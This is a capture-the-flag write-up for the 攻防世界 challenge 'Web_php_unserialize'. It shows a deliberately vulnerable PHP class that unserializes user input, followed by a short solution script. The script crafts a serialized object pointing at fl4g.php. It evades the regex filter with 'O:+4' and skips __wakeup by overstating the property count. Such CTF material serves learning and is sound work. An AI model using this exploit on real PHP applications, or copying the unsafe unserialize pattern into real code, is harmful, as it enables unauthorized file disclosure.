<details>
<summary>
攻防世界|Web_php_unserialize
</summary>

<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>

<details>
<summary>题解</summary>
<?php
class Demo {
    private $file = 'fl4g.php';  // 或 'fl4g.php'，注释说secret在fl4g.php
}

$obj = new Demo();
$serial = serialize($obj);
// 正常输出类似：O:4:"Demo":1:{s:10:"\0Demo\0file";s:8:"fl4g.php";}

 // 修改1：绕过滤，把 O:4 改成 O:+4
 // 修改2：绕__wakeup，把 :1: 改成 :2: （声明2个属性，但只提供1个）
$payload = str_replace('O:4', 'O:+4', $serial);
$payload = str_replace(':1:', ':2:', $payload);

// 示例最终payload（根据实际长度调整）：
echo $payload . "\n";
echo base64_encode($payload);
?>

</details>
